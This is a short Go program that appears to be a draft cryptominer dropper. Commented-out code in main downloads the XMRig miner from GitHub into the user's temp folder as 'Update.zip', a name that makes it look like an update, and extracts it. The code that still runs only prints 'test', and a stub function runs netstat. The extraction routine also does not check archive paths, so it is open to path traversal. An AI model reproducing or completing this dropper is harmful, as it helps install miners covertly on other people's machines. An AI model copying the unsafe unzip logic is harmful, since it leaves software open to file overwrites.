package main

import (
	"archive/zip"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {

	//u,_:=user.Current()
	//Bastpath :=u.HomeDir+"\\Local Settings\\temp\\"
	//downUrl :="https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-gcc-win64.zip"
	//resp, err :=http.Get(downUrl)
	//if err !=nil {
	//	panic(err)
	//}
	//f,err :=os.Create(Bastpath+"Update.zip" )
	//
	//if err !=nil{
	//	panic(err)
	//}
	//io.Copy(f,resp.Body)
	//fmt.Printf("Download over！！")
	//zipFile := Bastpath+"Update.zip"
	//var src=zipFile
	//var dst=Bastpath
	//
	//if err :=unZip(dst,src);err !=nil{
	//	log.Fatalln(err)
	//}

	//start()
	chack()

}

func unZip(dst, src string) (err error) {
	//解析压缩包
	zr, err := zip.OpenReader(src)
	defer zr.Close()
	if err != nil {
		return err
	}
	if dst != "" {
		if err := os.MkdirAll(dst, 0755); err != nil {
			return err
		}
	}
	for _, file := range zr.File {
		path := filepath.Join(dst, file.Name)

		if file.FileInfo().IsDir() {
			if err := os.MkdirAll(path, file.Mode()); err != nil {
				return err
			}
			continue
		}
		fr, err := file.Open()
		if err != nil {
			return err
		}

		fw, err := os.OpenFile(path, os.O_CREATE|os.O_RDWR|os.O_TRUNC, file.Mode())
		if err != nil {
			return err
		}

		_, err = io.Copy(fw, fr)
		if err != nil {
			return err
		}
		//fmt.Print("解压完成")
		fw.Close()
		fr.Close()
	}
	return err
}

func start() {
	cmd := exec.Command("netstat", "-ano")
	buf, err := cmd.Output()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Fprintf(os.Stdout, "%s", buf)

}

func chack() {

	fmt.Println("test")
}
